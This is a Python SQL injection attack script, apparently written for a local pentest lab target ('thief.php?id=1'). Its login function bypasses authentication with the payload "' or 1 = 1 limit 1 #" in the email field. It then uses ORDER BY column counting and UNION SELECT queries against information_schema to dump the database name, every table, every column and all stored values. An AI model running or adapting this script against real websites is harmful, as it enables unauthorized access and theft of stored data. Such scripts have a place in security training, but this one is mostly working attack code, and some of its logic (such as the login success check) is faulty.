import requests
from bs4 import BeautifulSoup
from getopt import getopt
import sys

s = requests.Session()
URL = ""
BYURL = "http://localhost/pentest/UAP/speedyninja/thief.php?id=1"
TOTAL_COLUMNS = 0
DB_NAME = ""


def get_value_in_column(col, table):
    query = " FROM " + table
    url = generate_union_url(
        query, "concat(\"<data>\", group_concat(" + col + "), \"<\data>\")")
    response = s.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    result = soup.find("data")

    if result:
        return result.text.split(",")
    return []


def get_column_in_table(table):
    query = " FROM information_schema.columns WHERE table_schema = '" + \
        DB_NAME + "' AND table_name = '" + table + "'"
    url = generate_union_url(
        query, "concat(\"<data>\", group_concat(column_name, \";\",data_type ), \"<\data>\")")
    response = s.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    result = soup.find("data")

    if result:
        return result.text.split(",")
    return []


def get_total_columns():
    count = 1
    while True:
        url = BYURL + " order by " + str(count)
        response = s.get(url)
        if "error" in response.text:
            break
        count += 1
    return count-1


def generate_union_url(query, replacement):
    url = BYURL + " union select "
    for i in range(1, TOTAL_COLUMNS+1):
        url += replacement
        if i != TOTAL_COLUMNS:
            url += ", "
    return url + query + " LIMIT 1 OFFSET 1"


def get_db_name():
    url = generate_union_url("", "concat(\"<data>\", database(), \"<\data>\")")
    response = s.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    result = soup.find("data")

    if result:
        return result.text
    return ""


def get_tables():
    query = " FROM information_schema.tables WHERE table_schema = '" + DB_NAME + "'"
    url = generate_union_url(
        query, "concat(\"<data>\", group_concat(table_name), \"<\data>\")")
    response = s.get(url)
    soup = BeautifulSoup(response.text, "html.parser")

    result = soup.find("data")

    if result:
        return result.text.split(",")
    return []


def inject():
    global TOTAL_COLUMNS, DB_NAME
    TOTAL_COLUMNS = get_total_columns()
    print("Total columns: " + str(TOTAL_COLUMNS))
    DB_NAME = get_db_name()
    print("Database name : " + DB_NAME)
    tables = get_tables()
    for table in tables:
        print("Table name: " + table)
        column = get_column_in_table(table)
        for col in column:
            column_name = col.split(";")[0]
            data_type = col.split(";")[1]
            print(column_name + "(" + data_type + "): ", end="")
            values = get_value_in_column(column_name, table)
            print(values)
        print("")


def help():
    pass


def validate_url(url):
    Response = s.get(url)
    if Response.status_code == 200:
        return True
    print("The request URL is invalid. [Requested URL : " + URL + "]")
    print("Thanks for using this program")
    return False


def login(url):
    response = s.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    CSRFtoken = soup.find(
        "input", {"name": "CSRFtoken", "type": "hidden"}).get("value")
    next_target = soup.find("form").get("action")

    payload = {
        "email": "' or 1 = 1 limit 1 #",
        "token": CSRFtoken,
        "password": "asdasd",
        "submit": "asdasd"
    }

    login_response = s.post(URL + next_target, payload)

    print("Try login using sql injection")

    if login_response != response.url:
        print("Successfully login")
        print(CSRFtoken)
        print("Successfully login the website is now vulnerable to sql injection")
        inject()
    else:
        print("Failed login. Website is not vulnerable to sql injection")
        print("Thank you for using this program")


def main():
    global URL

    opts, _ = getopt(sys.argv[1:], "u:h:", ["--url", "--help"])

    for key, val in opts:
        if key in ["-u", "--url"]:
            URL = val
        elif key in ["-h", "--help"]:
            help()

    if validate_url(URL):
        login(URL)


if __name__ == "__main__":
    main()
